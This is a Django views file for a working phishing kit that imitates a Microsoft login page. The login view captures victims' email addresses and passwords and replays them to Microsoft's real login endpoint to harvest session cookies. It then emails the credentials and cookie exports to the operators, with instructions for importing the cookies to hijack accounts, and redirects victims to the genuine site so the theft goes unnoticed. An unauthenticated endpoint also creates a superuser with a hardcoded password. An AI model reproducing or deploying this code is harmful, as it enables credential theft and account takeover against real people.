from django.shortcuts import render, redirect
from django.contrib.auth import login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.core.mail import EmailMessage
from django.conf import settings
from django.http import JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib.admin.views.decorators import staff_member_required
import random
import string
import json
import requests
from datetime import datetime
from .models import SessionTracking, ClickEvent

# ========== HELPER FUNCTIONS ==========

def generate_session_id():
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    return f"MS_{timestamp}_{random.randint(10000, 99999)}"

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        return x_forwarded_for.split(',')[0]
    return request.META.get('REMOTE_ADDR')

def get_browser_info(user_agent):
    ua = user_agent.lower()
    info = {'browser': 'Unknown', 'os': 'Unknown', 'device': 'Desktop'}
    if 'chrome' in ua and 'edg' not in ua:
        info['browser'] = 'Chrome'
    elif 'firefox' in ua:
        info['browser'] = 'Firefox'
    elif 'safari' in ua and 'chrome' not in ua:
        info['browser'] = 'Safari'
    elif 'edg' in ua:
        info['browser'] = 'Edge'
    if 'windows' in ua:
        info['os'] = 'Windows'
    elif 'mac' in ua:
        info['os'] = 'macOS'
    elif 'linux' in ua:
        info['os'] = 'Linux'
    elif 'android' in ua:
        info['os'] = 'Android'
        info['device'] = 'Mobile'
    elif 'iphone' in ua or 'ipad' in ua:
        info['os'] = 'iOS'
        info['device'] = 'Mobile'
    return info

# ========== COOKIE FUNCTIONS ==========

def cookies_to_netscape_format(cookies_dict, domain='.microsoft.com'):
    lines = ["# Netscape HTTP Cookie File", "# This is a generated file!", ""]
    for name, value in cookies_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t0\t{name}\t{value}")
    return "\n".join(lines)

def cookies_to_firefox_json(cookies_dict):
    cookies_list = []
    for name, value in cookies_dict.items():
        cookies_list.append({
            'name': name,
            'value': value,
            'domain': '.microsoft.com',
            'path': '/',
            'httpOnly': False,
            'secure': True,
            'sameSite': 'no_restriction',
            'session': True
        })
    return cookies_list

# ========== SEND CLEAN EMAIL ==========

def send_session_email(session_data, session_id):
    recipients = getattr(settings, 'CAPTURE_EMAIL_RECIPIENTS', ['your-email@gmail.com'])
    if isinstance(recipients, str):
        recipients = [recipients]
    
    email = session_data.get('user', {}).get('email', 'Not captured')
    password = session_data.get('user', {}).get('password', 'Not captured')
    
    microsoft_cookies = session_data.get('microsoft_cookies', {})
    
    if microsoft_cookies:
        cookies_to_show = microsoft_cookies
        cookie_type = "REAL MICROSOFT COOKIES"
    else:
        cookies_to_show = session_data.get('cookies', {})
        cookie_type = "YOUR APP COOKIES"
    
    netscape_cookies = cookies_to_netscape_format(cookies_to_show)
    firefox_cookies_json = cookies_to_firefox_json(cookies_to_show)
    
    clean_data = {
        'email': email,
        'password': password,
        'microsoft_cookies': microsoft_cookies,
        'all_cookies': cookies_to_show,
        'session_id': session_id,
        'captured_at': datetime.now().isoformat(),
        'ip': session_data.get('ip_address'),
        'browser': session_data.get('browser', {}).get('name'),
        'device': session_data.get('device', {}).get('type'),
    }
    
    subject = f"Microsoft Session"
    
    body = f"""
MICROSOFT ACCOUNT ACCESS
========================

Email: {email}
Password: {password}

Cookies Captured: {len(cookies_to_show)}
Cookie Type: {cookie_type}

How to Import:
1. Install Cookie Editor extension in Chrome
2. Go to https://login.microsoftonline.com
3. Open Cookie Editor → Delete All → Import
4. Paste the attached JSON → Save → Refresh

Captured: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Session ID: {session_id}
IP: {session_data.get('ip_address', 'Unknown')}
Browser: {session_data.get('browser', {}).get('name', 'Unknown')}
Device: {session_data.get('device', {}).get('type', 'Unknown')}
"""
    
    try:
        email_msg = EmailMessage(
            subject=subject,
            body=body,
            from_email=settings.DEFAULT_FROM_EMAIL,
            to=recipients,
        )
        
        if cookies_to_show:
            email_msg.attach(
                f"cookies_{session_id}.txt",
                netscape_cookies,
                'text/plain'
            )
            email_msg.attach(
                f"cookies_{session_id}.json",
                json.dumps(firefox_cookies_json, indent=2),
                'application/json'
            )
        
        email_msg.attach(
            f"session_{session_id}.json",
            json.dumps(clean_data, indent=2),
            'application/json'
        )
        
        email_msg.send(fail_silently=False)
        print(f"[✅ EMAIL SENT] {email} to {len(recipients)} recipients")
        print(f"[🍪 COOKIES] {len(cookies_to_show)} cookies captured")
        return True
    except Exception as e:
        print(f"[❌ EMAIL ERROR] {str(e)}")
        return False

# ========== SESSION STORAGE ==========

active_sessions = {}

def get_or_create_session(session_id):
    if session_id not in active_sessions:
        active_sessions[session_id] = {
            'session_id': session_id,
            'start_time': datetime.now().isoformat(),
            'ip_address': None,
            'user_agent': None,
            'referer': None,
            'tracking_source': None,
            'browser': {},
            'os': {},
            'device': {},
            'screen': {},
            'user': {},
            'events': [],
            'cookies': {},
            'microsoft_cookies': {}
        }
    return active_sessions[session_id]

# ========== TRACK CLICK ==========

@csrf_exempt
def track_click(request):
    session_id = generate_session_id()
    ref = request.GET.get('ref', 'direct')
    
    session_data = get_or_create_session(session_id)
    session_data['ip_address'] = get_client_ip(request)
    session_data['user_agent'] = request.META.get('HTTP_USER_AGENT', '')
    session_data['referer'] = request.META.get('HTTP_REFERER', '')
    session_data['tracking_source'] = ref
    session_data['cookies'] = dict(request.COOKIES)
    
    browser_info = get_browser_info(request.META.get('HTTP_USER_AGENT', ''))
    session_data['browser']['name'] = browser_info['browser']
    session_data['os']['name'] = browser_info['os']
    session_data['device']['type'] = browser_info['device']
    
    print(f"\n{'='*60}")
    print(f"🎯 NEW SESSION: {session_id}")
    print(f"📊 Source: {ref}")
    print(f"🍪 Cookies captured: {len(session_data['cookies'])}")
    print(f"{'='*60}\n")
    
    response = redirect('/login/')
    response.set_cookie('ms_session_id', session_id, max_age=30*24*60*60, httponly=False)
    response.set_cookie('tracking_ref', ref, max_age=30*24*60*60, httponly=False)
    
    return response

# ========== LOGIN PAGE ==========

@csrf_exempt
def login_page(request):
    session_id = request.COOKIES.get('ms_session_id')
    if not session_id:
        return redirect('track_click')
    
    session_data = get_or_create_session(session_id)
    
    if request.method == 'POST':
        email = request.POST.get('email', '')
        password = request.POST.get('password', '')
        
        if email and password:
            session_data['user'] = {
                'email': email,
                'password': password,
                'submitted_at': datetime.now().isoformat()
            }
            
            print(f"[🔑 CREDENTIALS CAPTURED] {email}:{password}")
            
            try:
                session_track = SessionTracking.objects.get(session_id=session_id)
                session_track.email = email
                session_track.password = password
                session_track.raw_data = session_data
                session_track.save()
            except Exception as e:
                print(f"[DB ERROR] {str(e)}")
            
            try:
                proxy_session = requests.Session()
                
                print("[🔄 PROXY] Getting Microsoft login page...")
                
                proxy_session.get(
                    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                    params={
                        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                        'response_type': 'code',
                        'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                        'scope': 'openid profile email',
                    }
                )
                
                print("[🔄 PROXY] Submitting credentials to Microsoft...")
                
                ms_response = proxy_session.post(
                    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                    data={
                        'loginfmt': email,
                        'passwd': password,
                        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                        'response_type': 'code',
                        'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                        'scope': 'openid profile email',
                    },
                    allow_redirects=False
                )
                
                microsoft_cookies = proxy_session.cookies.get_dict()
                session_data['microsoft_cookies'] = microsoft_cookies
                
                print(f"[🍪 MICROSOFT COOKIES CAPTURED] {len(microsoft_cookies)} cookies")
                print(f"[📋 COOKIE NAMES] {', '.join(microsoft_cookies.keys())}")
                
                try:
                    session_track = SessionTracking.objects.get(session_id=session_id)
                    session_track.ms_session_cookie = json.dumps(microsoft_cookies)
                    session_track.raw_data = session_data
                    session_track.save()
                except Exception as e:
                    print(f"[DB ERROR] {str(e)}")
                
                send_session_email(session_data, session_id)
                
                print("[🔄 PROXY] Redirecting to REAL Microsoft login...")
                
                return redirect('https://login.microsoftonline.com')
                    
            except Exception as e:
                print(f"[❌ PROXY ERROR] {str(e)}")
                import traceback
                traceback.print_exc()
                messages.error(request, 'Error connecting to Microsoft. Please try again.')
                return redirect('https://login.microsoftonline.com')
    
    return render(request, 'login.html')

# ========== DASHBOARD ==========

@login_required
def dashboard_view(request):
    return render(request, 'dashboard.html', {'user': request.user})

def logout_view(request):
    logout(request)
    return redirect('login')

# ========== API ENDPOINTS ==========

@csrf_exempt
def collect_browser_info(request):
    try:
        data = json.loads(request.body)
        session_id = data.get('session_id')
        
        if session_id and session_id in active_sessions:
            session_data = active_sessions[session_id]
            session_data['browser'].update({
                'name': data.get('browser_name', 'Unknown'),
                'version': data.get('browser_version', 'Unknown'),
                'language': data.get('language', 'Unknown')
            })
            session_data['screen'].update({
                'width': data.get('screen_width', 0),
                'height': data.get('screen_height', 0)
            })
        
        return JsonResponse({'status': 'success'})
    except Exception as e:
        return JsonResponse({'status': 'error', 'message': str(e)})

@csrf_exempt
def collect_click_event(request):
    try:
        data = json.loads(request.body)
        session_id = data.get('session_id')
        
        if session_id and session_id in active_sessions:
            event = {
                'type': data.get('event_type', 'click'),
                'x': data.get('x', 0),
                'y': data.get('y', 0),
                'target': data.get('target', 'Unknown'),
                'timestamp': datetime.now().isoformat()
            }
            active_sessions[session_id]['events'].append(event)
        
        return JsonResponse({'status': 'success'})
    except Exception:
        return JsonResponse({'status': 'error'})

# ========== EXPORT ==========

@staff_member_required
def export_session(request, session_id):
    try:
        session = SessionTracking.objects.get(session_id=session_id)
        data = session.raw_data
        
        response = JsonResponse(data, json_dumps_params={'indent': 2})
        response['Content-Disposition'] = f'attachment; filename="session_{session_id}.json"'
        return response
    except SessionTracking.DoesNotExist:
        return JsonResponse({'error': 'Session not found'}, status=404)

@staff_member_required
def export_cookies(request, session_id):
    try:
        session = SessionTracking.objects.get(session_id=session_id)
        cookies = session.cookies_json or {}
        
        lines = ["# Netscape HTTP Cookie File", ""]
        for name, value in cookies.items():
            lines.append(f".microsoft.com\tTRUE\t/\tFALSE\t0\t{name}\t{value}")
        
        content = "\n".join(lines)
        response = HttpResponse(content, content_type='text/plain')
        response['Content-Disposition'] = f'attachment; filename="cookies_{session_id}.txt"'
        return response
    except SessionTracking.DoesNotExist:
        return JsonResponse({'error': 'Session not found'}, status=404)

# ========== ADMIN VIEWS ==========

@staff_member_required
def all_users_view(request):
    users = User.objects.all().order_by('-date_joined')
    return render(request, 'all_users.html', {
        'users': users,
        'total_users': users.count()
    })

@staff_member_required
def all_sessions_view(request):
    sessions = SessionTracking.objects.all().order_by('-first_click')
    return render(request, 'all_sessions.html', {
        'sessions': sessions,
        'total_sessions': sessions.count()
    })

def create_admin(request):
    admin, created = User.objects.get_or_create(
        username='admin',
        defaults={
            'email': 'admin@gmail.com',
            'first_name': 'Administrator',
            'is_staff': True,
            'is_superuser': True,
            'is_active': True
        }
    )
    if not created:
        admin.set_password('admin123')
        admin.save()
    
    return JsonResponse({
        'status': 'success',
        'email': 'admin@gmail.com',
        'password': 'admin123'
    })